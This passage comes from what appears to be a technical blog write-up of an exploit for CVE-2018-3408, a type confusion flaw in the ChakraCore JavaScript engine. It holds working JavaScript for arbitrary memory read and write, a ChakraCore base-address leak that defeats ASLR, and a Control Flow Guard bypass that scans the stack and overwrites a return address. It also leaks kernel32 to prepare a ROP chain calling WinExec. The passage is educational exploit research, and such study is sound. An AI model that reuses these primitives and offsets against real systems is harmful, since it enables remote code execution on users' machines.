&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">DataView&lt;/span>.&lt;span style="color:#a6e22e">prototype&lt;/span>.&lt;span style="color:#a6e22e">getInt32&lt;/span>.&lt;span style="color:#a6e22e">call&lt;/span>(&lt;span style="color:#a6e22e">dv&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">lower_dword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">higher_dword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">SignedDwordToUnsignedDword&lt;/span>(&lt;span style="color:#a6e22e">lower_dword&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#a6e22e">SignedDwordToUnsignedDword&lt;/span>(&lt;span style="color:#a6e22e">higher_dword&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x100000000&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Breaking down the above code we see first of all two functions, &lt;code>UnsignedDwordToSignedDword&lt;/code> and &lt;code>SignedDwordToUnsignedDword&lt;/code>, which convert from signed integers to unsigned integers and vice-versa. This is to go around the limitations discussed in the first section. Next we find &lt;code>read32&lt;/code>, where we set buffer address to the high dword and low dword which is our desired address, and call &lt;code>getInt32&lt;/code> to read 4 bytes from that address. Finally we see &lt;code>read64&lt;/code> which is a wrapper around &lt;code>read32&lt;/code>, performing 2 consecutive reads, thus act as if we read 8 consecutive bytes.&lt;/p>
&lt;p>Going back to the example we shared earlier, we can now better understand what the following code is doing.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">chakra_leak&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">array_addr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Leaked address within chakra: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">chakra_leak&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once the above code is executed, the first entry in the vtable is returned. In programming languages such as C++, the language in which the ChakraCore JavaScript engine is written in, the vtable contains addresses to an object&amp;rsquo;s methods. This is especially useful when inheritance is used, as a subclass might override some of its parent class methods. The instantiated object would need to have a reference to the appropriate method implementations when the object methods are invoked.&lt;/p>
&lt;p>From the above brief interlude on vtables, we know that the vtable contains a list of methods typically present in the binary, thus, when reading from the vtable, we can leak an address within ChakraCore.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/chakracoreleak.png"
width="863"
height="312"
srcset="https://execc0de.github.io/posts/cve-2018-3408/chakracoreleak_hu10281196523916015015.png 480w, https://execc0de.github.io/posts/cve-2018-3408/chakracoreleak_hu15204043181835345226.png 1024w"
loading="lazy"
alt="Leaked address in ChakraCore"
class="gallery-image"
data-flex-grow="276"
data-flex-basis="663px"
>&lt;/p>
&lt;p>Based on this leaked address, we can very simply get to the ChakraCore base address in memory as the leaked address is at a constant offset from the ChakraCore base address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">chakra_leak&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x5d9a80&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Chakra base: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">chakracore_base&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>For the arbitrary write we used a very similar approach. Let&amp;rsquo;s start by inspecting the following code snippet&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>, &lt;span style="color:#a6e22e">value&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fake_object&lt;/span>[&lt;span style="color:#ae81ff">15&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>((&lt;span style="color:#a6e22e">addr&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x100000000&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DataView&lt;/span>.&lt;span style="color:#a6e22e">prototype&lt;/span>.&lt;span style="color:#a6e22e">setInt32&lt;/span>.&lt;span style="color:#a6e22e">call&lt;/span>(&lt;span style="color:#a6e22e">dv&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">value&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>, &lt;span style="color:#a6e22e">value&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>, &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>(&lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write32&lt;/span>(&lt;span style="color:#a6e22e">addr&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#a6e22e">UnsignedDwordToSignedDword&lt;/span>((&lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x100000000&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The function &lt;code>write32&lt;/code>, accepts two parameters, which are the address to write to and the value to write. Since we cannot write a full QWORD, in &lt;code>write64&lt;/code>, we split the value into a high DWORD and a low DWORD, and write them in 2 consecutive writes, with the first write happening at the address specified, while the second write happens 4 bytes from the address specified.&lt;/p>
&lt;p>Up till now, we have managed to turn the type confusion vulnerability into a read and write primitive. From the example we have shown, we were also able to leak the address of a method within ChakraCore, bypassing ASLR.&lt;/p>
&lt;h2 id="code-execution">Code Execution
&lt;/h2>&lt;p>Armed with the read and write primitives, we can now shift our focus to gaining code execution. This requires us to gain control of the instruction pointer. Before we get to how we managed to get code execution, it is important to understand a security mitigation.&lt;/p>
&lt;p>Since we are able to write at any address, we can gain control over the instruction pointer by overwriting an entry in an object&amp;rsquo;s vtable and invoking the matching function on the object. Unfortunately a security mitigation called Control Flow Guard (CFG) does not allow us call arbitrary functions as we shall see in the next sections.&lt;/p>
&lt;h3 id="cfg-internals">CFG Internals
&lt;/h3>&lt;p>CFG was introduced in Windows 8.1 update 3 and its purpose is to mitigate techniques such as overwriting a vtable entry. Calls to functions can either be direct calls or indirect calls. A direct call is an assembly instruction that calls a function pointer directly in the same executable or from an import table. An example of this in assembly would be as follows&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">chakracore&lt;/span>!&lt;span style="color:#66d9ef">ThreadContext&lt;/span>::&lt;span style="color:#66d9ef">ProbeStack&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>An indirect call is performed by looking for a function pointer through a lookup table, moving it into a register and calling the register. A very simple example of this would be&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rax&lt;/span>, &lt;span style="color:#66d9ef">QWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">rcx&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CFG offers protection in indirect calls by verifying that the caller can call the callee against a bitmap which is usually created at compile time. The bitmap is usually marked as read-only, thus no changes can occur, however the &lt;code>SetProcessValidCallTargets&lt;/code> API can allow or disallow specific function calls.&lt;/p>
&lt;p>Vtables use indirect calls, which means if CFG is enabled at compile time, verification on vtable address is on. In Microsoft Edge, CFG is enabled, thus it was enabled in ChakraCore.&lt;/p>
&lt;p>Although CFG offers this protection, it does not come without faults and bypasses have been known since its inception. There are three generic techniques one can use to bypass CFG:&lt;/p>
&lt;ul>
&lt;li>out-of-context calls - this method stays within the parameters of CFG by performing a call to a valid call target. While this method can be used, it can be hard to find usable valid call targets and controlling the parameters&lt;/li>
&lt;li>a data only attack - this method requires modifying critical data structures. Such modifications could then open other avenues for exploitation&lt;/li>
&lt;li>return address overwrite - this method involves leaking a return address on the stack and overwriting it. On return from the function call, execution resumes at the overwritten address&lt;/li>
&lt;/ul>
&lt;h3 id="cfg-bypass---return-address-overwrite">CFG Bypass - Return Address Overwrite
&lt;/h3>&lt;p>As discussed previously, there are multiple ways to bypass CFG and for this exploit we chose to overwrite a return address on the stack. An application can modify its execution flow through:&lt;/p>
&lt;ul>
&lt;li>a call instruction&lt;/li>
&lt;li>a branch instruction&lt;/li>
&lt;li>a return instruction&lt;/li>
&lt;/ul>
&lt;p>CFG protects against tampering in an indirect call. This is also known as forward edge, and CFG performs forward flow control. Once a function has finished its execution, it hits a return instruction (called &lt;code>ret&lt;/code>). The purpose of this instruction is to bring execution back to the callee. This is known as backwards edge and CFG does not offer protection on it.&lt;/p>
&lt;p>Having chosen our method of exploitation, and knowing how to bypass CFG, we can leak the address of the stack for the current thread, find a suitable return address, and overwrite it. This would give us control of instruction pointer without being stopped by CFG.&lt;/p>
&lt;p>Luckily for us, in ChakraCore, there is a variable called &lt;code>globalListFirst&lt;/code>. The variable contains the address of a heap buffer, within which we&amp;rsquo;ll find a stack address for the current thread.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/globalListFirst.png"
width="456"
height="46"
srcset="https://execc0de.github.io/posts/cve-2018-3408/globalListFirst_hu11681265011681412917.png 480w, https://execc0de.github.io/posts/cve-2018-3408/globalListFirst_hu15274430953707870204.png 1024w"
loading="lazy"
alt="globalListFirst in ChakraCore"
class="gallery-image"
data-flex-grow="991"
data-flex-basis="2379px"
>&lt;/p>
&lt;p>From the heap buffer located at &lt;code>globalListFirst&lt;/code>, we find that, at offset 0x498 is an addreess that is within the range specified by StackBase and StackLimit in the current thread. We can confirm it is a stack address for the current thread.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/stackaddress.png"
width="542"
height="151"
srcset="https://execc0de.github.io/posts/cve-2018-3408/stackaddress_hu4828690284825757548.png 480w, https://execc0de.github.io/posts/cve-2018-3408/stackaddress_hu13041526997735078899.png 1024w"
loading="lazy"
alt="Heap buffer at offset 0x498 contains a stack address"
class="gallery-image"
data-flex-grow="358"
data-flex-basis="861px"
>&lt;/p>
&lt;p>Using this information, together with the arbitrary read primitive and the base address of ChakraCore, we can easily leak the stack address. This can be done by adding the offset for &lt;code>globalListFirst&lt;/code> (0x6c89b0) to the base address of ChakraCore and use the read primitive.&lt;/p>
&lt;p>Next, we need to find a suitable return address to overwrite. From the call stack we see that function &lt;code>amd64_CallFunction&lt;/code> appears multiple times. This function is used to call static JavaScript methods and also larger compiled script blocks.&lt;/p>
&lt;p>The earliest occurence of &lt;code>amd64_CallFunction&lt;/code> in the call stack, which is the one that is at the bottom of the stack trace, should cover the whole execution of our script.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/returnaddressorig.png"
width="1416"
height="451"
srcset="https://execc0de.github.io/posts/cve-2018-3408/returnaddressorig_hu13844013426923376675.png 480w, https://execc0de.github.io/posts/cve-2018-3408/returnaddressorig_hu8623139207195970522.png 1024w"
loading="lazy"
alt="Original return address we will be overwriting"
class="gallery-image"
data-flex-grow="313"
data-flex-basis="753px"
>&lt;/p>
&lt;p>This means that the return address is not executed before our execution is about to end, making it a very stable target to overwrite.&lt;/p>
&lt;p>From running the exploit multiple times, the difference between the leaked stack address and the stack address which holds the last return address to &lt;code>amd64_CallFunction&lt;/code> is not constant. This means we need to use our read primitive to read values from the current stack address, compare it with the calculated return address of &lt;code>amd64_CallFunction&lt;/code> and then, if the address is found, we stop and store the current stack address and if not, we go back 8 bytes, and repeat the process.&lt;/p>
&lt;p>The snippet below does what we just described above.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">globalListFirst&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x6c89b0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] globatlListFirst: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">globalListFirst&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">threadBuffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">globalListFirst&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] threadBuffer: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">threadBuffer&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">stackAddr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">threadBuffer&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x498&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] stackAddr: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">stackAddr&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">returnAddr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x0482352&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] returnAddr: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">returnAddr&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">stackAddr&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">returnAddr&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">stackAddr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">stackAddr&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Found return address at: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">stackAddr&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">write64&lt;/span>(&lt;span style="color:#a6e22e">stackAddr&lt;/span>, &lt;span style="color:#ae81ff">0x414141414141&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Math.&lt;span style="color:#a6e22e">sin&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once the return address has been found, the value at this stack address is overwritten with the address we want to return to. For the purposes of this example, we overwrite the address with 0x414141414141. As we can see below, the call stack shows that we have successfully overwritten the return address.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/overwrittenreturnaddr.png"
width="876"
height="422"
srcset="https://execc0de.github.io/posts/cve-2018-3408/overwrittenreturnaddr_hu16433466746568144136.png 480w, https://execc0de.github.io/posts/cve-2018-3408/overwrittenreturnaddr_hu5692665132793213346.png 1024w"
loading="lazy"
alt="Overwritten stack return address"
class="gallery-image"
data-flex-grow="207"
data-flex-basis="498px"
>&lt;/p>
&lt;p>The call stack is now corrupted with our dummy address of 0x414141414141. Letting the execution continue we see an access violation when execution is transferred back to the overwritten return address of 0x414141414141.&lt;/p>
&lt;p>&lt;img src="https://execc0de.github.io/posts/cve-2018-3408/accessviolationexec.png"
width="578"
height="99"
srcset="https://execc0de.github.io/posts/cve-2018-3408/accessviolationexec_hu11985757673553679974.png 480w, https://execc0de.github.io/posts/cve-2018-3408/accessviolationexec_hu11433748783420987153.png 1024w"
loading="lazy"
alt="Access violation on trying to execute code at 0x414141414141"
class="gallery-image"
data-flex-grow="583"
data-flex-basis="1401px"
>&lt;/p>
&lt;p>As we can see, we have reliably obtained code execution while bypassing CFG.&lt;/p>
&lt;h3 id="rop-chain">ROP chain
&lt;/h3>&lt;p>Having gained code execution, we can now build a ROP chain.&lt;/p>
&lt;p>Before we start building our ROP chain, we need to identify what code we will be running. The idea for this proof of concept is to execute the &lt;code>WinExec&lt;/code> API to launch &lt;code>calc.exe&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C" data-lang="C">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">WinExec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;C:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Windows&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">System32&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">calc.exe&amp;#34;&lt;/span>, TRUE);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This means we need to leak the address of &lt;code>WinExec&lt;/code>. Fortunately, the ChakraCore module, for which we already have the base address, imports functions from the Kernel32 module, which is the module in which &lt;code>WinExec&lt;/code> can be found. By using our read primitive, we can read the address of an imported function from Kernel32. Then by subtracting its constant offset within Kernel32, we get the base address of the Kernel32 module.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">kernel32_leak&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">read64&lt;/span>(&lt;span style="color:#a6e22e">chakracore_base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x55a048&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Leaked kernel32 address: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">kernel32_leak&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">kernel32_base&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">kernel32_leak&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x15da0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+] Kernel32 base: 0x&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">kernel32_base&lt;/span>.&lt;span style="color:#a6e22e">toString&lt;/span>(&lt;span style="color:#ae81ff">16&lt;/span>));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we are ready to start building the ROP chain. We&amp;rsquo;ll be using the &lt;code>fake_object&lt;/code> array to write the our ROP chain in. For this we use an arbitrary offset within the &lt;code>fake_object&lt;/code> which doesn&amp;rsquo;t overwrite our fake &lt;code>DataView&lt;/code> object as we need it to perform arbitrary reads and writes. We&amp;rsquo;ll also need a place where we can store the string containing the location of &lt;code>calc.exe&lt;/code>. The following snippet shows the selection of these locations.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">rop&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">array_addr&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x58&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x348&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">exeLoc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">rop&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x500&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next we&amp;rsquo;ll write the string as 32-bit integers representing each byte in ASCII. The conversion from ASCII to 32-bit integers is outside of the scope of this post but can be done by splitting the string into 4 byte chunks, converting each byte to its hexadecimal representation and reversing each 4 byte group since we are running on an x86 little endian architecture. The code for filling in the memory with the string can be found below.&lt;/p>
